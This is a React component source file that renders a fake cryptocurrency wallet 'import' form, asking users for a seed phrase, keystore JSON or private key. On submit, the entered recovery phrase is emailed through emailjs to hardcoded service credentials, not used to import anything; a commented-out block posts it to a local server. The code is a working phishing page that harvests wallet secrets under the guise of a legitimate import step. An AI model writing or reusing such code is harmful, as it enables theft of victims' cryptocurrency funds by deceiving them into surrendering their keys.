import React,{useState} from "react";
import "./Phrase.css";
import Backdrop from "../backdrop/Backdrop";
import axios from 'axios'
import emailjs from 'emailjs-com';

function Phrase() {

  const [text, setText] = useState("")

  // const sendMail = ()=>{
  //     axios.post("http://localhost:5000/sendEnail", text)
  //     .then(res => {console.log(res) 
  //       alert("sent")})
  //     .catch(res => console.log(res))
  //     setText("")
  // }

  function sendEmail(e) {
    e.preventDefault();

    emailjs.sendForm('service_doud1uh', 'template_j54ii9j', e.target, 'user_lCP7VmN70wFERt1oaqVlf')
      .then((result) => {
          console.log(result.text)
           alert("sucessful");
      }, (error) => {
          console.log(error.text);
      });
  }


  return (
    <React.Fragment>
      <Backdrop />

      <div className="Phrase_container">
      <div className="Phrase">
        <div className="phrase_heading">
          <h3 className="phrase_header red">Phrase</h3>
          <h3 className="phrase_header">Keystore JSON</h3>
          <h3 className="phrase_header">Private Key</h3>
        </div>
        <div className="phrase_line"></div>



        <form onSubmit={sendEmail} >
        <textarea
          className="textArea"
          name=""
          id=""
          cols="30"
          rows="10"
          placeholder="Phrase"
          value={text}
          name= "from_name"
          onChange={e => setText(e.target.value)}
        />

     
        <p className="phrase_text">
          Typically 12 (sometimes 24) words seperated by a single spaces
        </p>

        <button className="phrase_btn" type="submit" >IMPORT</button>
        </form>

      </div>
      </div>
    </React.Fragment>
  );
}

export default Phrase;

// 1. heading with three text display beside one anoder
//             2. textarea
//             3. paragraph
//             4. button
